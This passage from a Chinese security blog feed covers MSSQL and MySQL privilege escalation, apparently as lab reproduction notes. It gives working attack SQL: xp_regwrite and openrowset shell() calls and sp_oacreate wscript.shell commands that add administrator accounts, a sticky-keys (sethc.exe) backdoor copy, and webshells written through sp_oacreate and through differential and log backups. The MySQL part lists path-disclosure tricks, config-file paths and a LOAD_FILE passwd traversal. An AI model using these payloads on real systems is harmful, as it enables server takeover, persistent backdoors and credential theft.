id="xp-regwrite-沙盒提权（server-2008不可用）"><a href="#xp-regwrite-沙盒提权（server-2008不可用）" class="headerlink" title="xp_regwrite 沙盒提权（server 2008不可用）"></a>xp_regwrite 沙盒提权（server 2008不可用）</h5><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p><p>使用场景： xp_regwrite 存储过程可用</p><p>1.检查xp_cmdshell是否开启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtyoe=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure><p>2.开启沙盒模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SandBoxMode参数含义（默认是2）</span><br><span class="line">0：在任何所有者中禁止启用安全模式</span><br><span class="line">1 ：为仅在允许范围内</span><br><span class="line">2 ：必须在access模式下</span><br><span class="line">3：完全开启</span><br></pre></td></tr></table></figure><p>3 利用jet.oledb执行系统命令添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net user quan 121345 /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p><img src="image-20210915150118444.png" alt="image-20210915150118444"></p><p><strong>sql server2008</strong></p><p>4将quan用户添加至管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net localgroup administrators quan /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</p><p>常见存储过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_getfiledetails</span><br><span class="line">Sp_OACreate</span><br><span class="line">Sp_OADestroy</span><br><span class="line">Sp_OAGetErrorInfo</span><br><span class="line">Sp_OAGetProperty</span><br><span class="line">Sp_OAMethod</span><br><span class="line">Sp_OASetProperty</span><br><span class="line">Sp_OAStop</span><br><span class="line">Xp_regaddmultistring</span><br><span class="line">Xp_regdeletekey</span><br><span class="line">Xp_regdeletevalue</span><br><span class="line">Xp_regenumvalues</span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring</span><br><span class="line">Xp_regwrite</span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure><h2 id="MSSQL-触发器"><a href="#MSSQL-触发器" class="headerlink" title="MSSQL 触发器"></a>MSSQL 触发器</h2><h3 id="什么是触发器"><a href="#什么是触发器" class="headerlink" title="什么是触发器"></a>什么是触发器</h3><p>触发器对表进行插入、更新、删除的时候会自动执行的特殊存储过程。触发器一般用在check约束更加复杂的约束上面。触发器和普通的存储过程的区别是：触发器是当对某一个表进行操作。诸如：update、insert、delete这些操作的时候，系统会自动调用执行该表上对应的触发器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建触发器的语法：</span><br><span class="line">CREATE TRIGGER trigger_name </span><br><span class="line"> ON table_name </span><br><span class="line"> [WITH ENCRYPTION] </span><br><span class="line"> FOR | AFTER | INSTEAD OF [DELETE, INSERT, UPDATE] </span><br><span class="line"> AS  </span><br><span class="line"> T-SQL语句 </span><br><span class="line">GO </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建触发当执行update操作时执行计算器的触发器</span><br><span class="line">set ANSI_NULLS on</span><br><span class="line">go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1]</span><br><span class="line">on [users]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">    execute master..xp_cmdshell &#x27;cmd.exe /c calc.exe&#x27;</span><br><span class="line">end</span><br><span class="line">go</span><br><span class="line">然后执行update操作</span><br><span class="line">update test..users set username=&#x27;admin4&#x27; where username=&#x27;admin&#x27;</span><br><span class="line">成功触发触发器</span><br></pre></td></tr></table></figure><h2 id="SP-OACREATE的利用"><a href="#SP-OACREATE的利用" class="headerlink" title="SP_OACREATE的利用"></a>SP_OACREATE的利用</h2><p>SP_OACREATE是mssql的COM组件，如果xp_cmdshell组件被删除了话，还可以使用sp_oacreate来进行提权。</p><p>查看sp_oacreate状态,下图证明该存储过程存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看状态</span><br><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br><span class="line">#查看是否存在，返回1则代表存在</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210914174638506.png" alt="image-20210914174638506"></p><p><img src="image-20210914174808858.png" alt="image-20210914174808858"></p><p>首先在使用该组件时需要将该组件启动后才能正常使用，否则将报错</p><p><img src="image-20210914175042349.png" alt="image-20210914175042349"></p><h3 id="开启sp-oacreate"><a href="#开启sp-oacreate" class="headerlink" title="开启sp_oacreate"></a>开启sp_oacreate</h3><p>输入以下指令即可开启sp_oacreate</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE;   </span><br><span class="line"><span class="meta">#</span><span class="bash">当启用ole automation procedures时，对sp_oacreate的调用将会启动OLE共享执行环境。</span></span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p><img src="image-20210914175150774.png" alt="image-20210914175150774"></p><h3 id="关闭sp-oacreate"><a href="#关闭sp-oacreate" class="headerlink" title="关闭sp_oacreate"></a>关闭sp_oacreate</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure><h3 id="sp-oacreate的用法"><a href="#sp-oacreate的用法" class="headerlink" title="sp_oacreate的用法"></a>sp_oacreate的用法</h3><h4 id="执行系统命令（调用wscript-shell）"><a href="#执行系统命令（调用wscript-shell）" class="headerlink" title="执行系统命令（调用wscript.shell）"></a>执行系统命令（调用wscript.shell）</h4><p>原理：调用了ole对象的run方法来执行系统命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210914195333335.png" alt="image-20210914195333335"></p><h4 id="添加系统账户并提权"><a href="#添加系统账户并提权" class="headerlink" title="添加系统账户并提权"></a>添加系统账户并提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">win 2000</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\winnt\system32\cmd.exe /c net user 123 123 /add&#x27;</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\winnt\system32\cmd.exe /c net localgroup administrators 123/add&#x27;</span><br><span class="line"></span><br><span class="line">winXP以及2003</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c net user adminsss Admin123 /add&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">添加管理员组</span></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c net localgroup  administrators adminsss /add&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210915092701822.png" alt="image-20210915092701822"></p><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;c:\windows\explorer.exe&#x27; ,&#x27;c:\windows\system32\sethc.exe&#x27;</span><br></pre></td></tr></table></figure><h4 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @aa int;</span><br><span class="line"></span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @aa out;</span><br><span class="line"></span><br><span class="line">exec sp_oamethod @aa, &#x27;moveFile&#x27;,null,&#x27;C:\Users\Administrator\Desktop\12.php&#x27;, &#x27;C:\Users\Administrator\Desktop\11\12.php&#x27;;</span><br></pre></td></tr></table></figure><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @Result  int</span><br><span class="line"></span><br><span class="line">DECLARE @FSO_Token  int</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @FSO_Token  OUTPUT</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OAMethod @FSO_Token, &#x27;DeleteFile&#x27;, NULL, &#x27;C:\Users\Administrator\Desktop\11\12.php&#x27;</span><br><span class="line"></span><br><span class="line">EXEC @Result  = sp_OADestroy @FSO_Token</span><br></pre></td></tr></table></figure><h4 id="执行系统命令（调用shell-application）"><a href="#执行系统命令（调用shell-application）" class="headerlink" title="执行系统命令（调用shell.application）"></a>执行系统命令（调用shell.application）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;,@o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null,&#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;C:\1.txt&#x27;,&#x27;C:\windows\sytsem32&#x27;,&#x27;&#x27;,&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">win2008创建失败，原因未知</span><br></pre></td></tr></table></figure><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @f int,@g int</span><br><span class="line">exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output</span><br><span class="line">EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\shell.aspx&#x27;,1</span><br><span class="line">EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var a = &quot;un&quot;;var b = &quot;safe&quot;;Response.Write(eval(Request.Item[&quot;z&quot;],a+b));%&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210915145514404.png" alt="image-20210915145514404"></p><p>至此sp_oacreate 基本总结完毕，剩余的后期在进行补充，下面开始对常见的getshell方式进行总结</p><h2 id="MSSQL-GETSHELL"><a href="#MSSQL-GETSHELL" class="headerlink" title="MSSQL GETSHELL"></a>MSSQL GETSHELL</h2><p>上面已经总结了部分getshell的方式，这里主要想说一下日志getshell的方式，主要包括差异备份getshell以及log文件getshell两种！开始吧</p><h3 id="差异备份getshell"><a href="#差异备份getshell" class="headerlink" title="差异备份getshell"></a>差异备份getshell</h3><p>1.首先需要完整的备份一下我们的数据库，以mssqllibs数据库为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database mssqllibs to disk=&#x27;C:\inetpub\wwwroot\mssql.bak&#x27;</span><br></pre></td></tr></table></figure><p>2.创建一个新表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table cmd (a image);</span><br></pre></td></tr></table></figure><p>3.插入数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into cmd values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"><span class="meta">#</span><span class="bash">values的值为&lt;%execute(request(<span class="string">&quot;a&quot;</span>))%&gt;</span></span><br></pre></td></tr></table></figure><p>4.重新备份文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database mssqllibs to disk=&#x27;C:\inetpub\wwwroot\hhh.asp&#x27; WITH DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure><p>sql server 2008复现失败</p><h3 id="log备份getshell"><a href="#log备份getshell" class="headerlink" title="log备份getshell"></a>log备份getshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alter database testdb set RECOVERY FULL </span><br><span class="line">backup database testdb to disk = &#x27;c:\bak.bak&#x27;</span><br><span class="line">create table cmd (a image) </span><br><span class="line">backup log testdb to disk = &#x27;c:\aaa.bak&#x27; with init </span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line"><span class="meta">#</span><span class="bash">一句话密码是a</span></span><br><span class="line">backup log testdb to disk = &#x27;C:\inetpub\wwwroot\shell.asp&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210915162732303.png" alt="image-20210915162732303"></p><p>至此，mssql的利用总结完毕，部分的实验由于环境原因没有复现成功，后期实战遇到了在进行补充！</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>【1】<a href="https://paper.seebug.org/1525/#sql-server_2">https://paper.seebug.org/1525/#sql-server_2</a></p><p>【2】<a href="https://xz.aliyun.com/t/8603">https://xz.aliyun.com/t/8603</a></p><p>【3】<a href="https://y4er.com/post/mssql-getshell/">https://y4er.com/post/mssql-getshell/</a></p><p>【4】<a href="http://www.feidao.site/wordpress/?p=2451#shell">http://www.feidao.site/wordpress/?p=2451#shell</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql利用以及提权</title>
      <link href="/posts/62300/"/>
      <url>/posts/62300/</url>
      
        <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>mysql数据库是中小型企业中最常见的数据库之一，本文是对mysql在日常渗透过程中获取权限以及提权等操作的复现文，下面进入正题：</p><p>以下是靶机环境介绍：</p><ul><li>靶机： Windows10 x64</li><li>PHP版本：5.6</li><li>Mysql版本：5.7</li><li>Apache版本：2.4</li></ul><h1 id="获取权限方法："><a href="#获取权限方法：" class="headerlink" title="获取权限方法："></a>获取权限方法：</h1><h2 id="0x0-union-select-写shell"><a href="#0x0-union-select-写shell" class="headerlink" title="0x0 union select 写shell"></a>0x0 union select 写shell</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><p>（1） 对web目录具有写权限并且知道网站的绝对路径</p><p>（2）secure_file_priv 的值为 空，即secure_file_priv=’’</p><h3 id="2-获取-secure-file-priv的值"><a href="#2-获取-secure-file-priv的值" class="headerlink" title="2.获取 secure_file_priv的值"></a>2.获取 secure_file_priv的值</h3><p>我们可以通过mysql查询语句获取secure_file_priv的值，语句如下：</p><p>show global variables like “%secure%”;</p><p><img src="image-20210825191334394.png" alt="image-20210825191334394"></p><h3 id="3-secure-file-priv的作用"><a href="#3-secure-file-priv的作用" class="headerlink" title="3.secure_file_priv的作用"></a>3.secure_file_priv的作用</h3><p>secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。也就是说我们写入文件，导出文件的操作都会受到这个参数的限制，相对应的secure_file_priv的值不同时，起到的作用也不同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line">当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权</span><br><span class="line">当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权,这也是我们所需要的选项</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时secure_file_priv 对于用户来说是一个只读属性，只有通过mysql的配置文件my.ini进行配置，如果没有该属性，则可以在[mysqld]下 添加secure_file_priv=“”</p><p>来指定值为空，方便做实验！</p><h3 id="4-获取绝对路径"><a href="#4-获取绝对路径" class="headerlink" title="4.获取绝对路径"></a>4.获取绝对路径</h3><p>我们通过into outfile写入shell时需要知道网站的绝对路径，这里总结了几种获取网站绝对路径的方法。</p><h4 id="4-1-错误参数爆路径"><a href="#4-1-错误参数爆路径" class="headerlink" title="4.1 错误参数爆路径"></a>4.1 错误参数爆路径</h4><p>直接在url后面添加一个单引号，当单引号被正确执行时（没有被转义），服务器可能会返回错误信息，或者将提交的参数修改为一个不存在得到错误值时，也有可能爆出绝对路径 </p><h4 id="4-2-google-爆路径"><a href="#4-2-google-爆路径" class="headerlink" title="4.2 google 爆路径"></a>4.2 google 爆路径</h4><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure><p>4.3 测试文件爆路径</p><p>如果网站存在测试文件时，例如phpinfo()，我们可以通过该文件查看系统的配置信息，获取绝对路径</p><p>常见测试文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure><h4 id="4-3-phpmyadmin爆路径"><a href="#4-3-phpmyadmin爆路径" class="headerlink" title="4.3 phpmyadmin爆路径"></a>4.3 phpmyadmin爆路径</h4><p>通过phpmyadmin目录下的特定文件，有可能爆出物理路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpMyAdmin/index.php?lang[]=1</span><br><span class="line">/phpMyAdmin/phpinfo.php</span><br><span class="line">load_file()</span><br><span class="line">/phpmyadmin/themes/darkblue_orange/layout.inc.php</span><br><span class="line">/phpmyadmin/libraries/select_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/mcrypt.lib.php</span><br></pre></td></tr></table></figure><h4 id="4-4-配置文件找路径"><a href="#4-4-配置文件找路径" class="headerlink" title="4.4 配置文件找路径"></a>4.4 配置文件找路径</h4><p>如果注入点具备了文件读取权限，就可以使用load_file读取系统的配置文件，在找到其中的绝对路径，常见的配置文件路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">windows配置文件：</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini                         php配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml       IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</span><br><span class="line"></span><br><span class="line">Xampp文件路径</span><br><span class="line">C:\xampp\htdocs</span><br><span class="line"></span><br><span class="line">httpd.com配置文件</span><br><span class="line">C:\xampp\apache\conf/httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">C:\xampp\apache\onf\extra\httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">phpnow配置文件：</span><br><span class="line">网站默认路径</span><br><span class="line">D:\PHPnow-1.5.6\htdocs</span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line">D:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line"></span><br><span class="line">D:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.conf</span><br><span class="line"></span><br><span class="line">phpstudy配置文件：</span><br><span class="line">网站默认路径</span><br><span class="line"></span><br><span class="line">C:\phpstudy\www</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line"></span><br><span class="line">C:\phpStudy\Apache\conf\httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line"></span><br><span class="line">C:\phpStudy\Apache\conf\extra\httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">LAMPP配置文件：</span><br><span class="line">网站默认路径</span><br><span class="line"></span><br><span class="line">/opt/lampp/htdocs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line"></span><br><span class="line">/opt/lampp/etc/httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">/opt/lampp/etc/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">过滤敏感路径时;</span><br><span class="line">SELECT LOAD_FILE(&#x27;/etc/otherdir/../passwd&#x27;);   尝试绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-5-nginx文件类型错误解析爆路径"><a href="#4-5-nginx文件类型错误解析爆路径" class="headerlink" title="4.5 nginx文件类型错误解析爆路径"></a>4.5 nginx文件类型错误解析爆路径</h4><p>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p><h4 id="4-7-通过mysql函数和全局变量-查找mysql安装目录"><a href="#4-7-通过mysql函数和全局变量-查找mysql安装目录" class="headerlink" title="4.7 通过mysql函数和全局变量 查找mysql安装目录"></a>4.7 通过mysql函数和全局变量 查找mysql安装目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;  获取mysq安装路径</span><br></pre></td></tr></table></figure><p><img src="image-20210825194605357.png" alt="image-20210825194605357"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@datadir;   获取数据路径</span><br></pre></td></tr></table></figure><p><img src="image-20210825194621851.png" alt="image-20210825194621851"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;datadir&#x27;;   和上面一样</span><br></pre></td></tr></table></figure><h3 id="5-into-file-写shell"><a href="#5-into-file-写shell" class="headerlink" title="5.into file 写shell"></a>5.into file 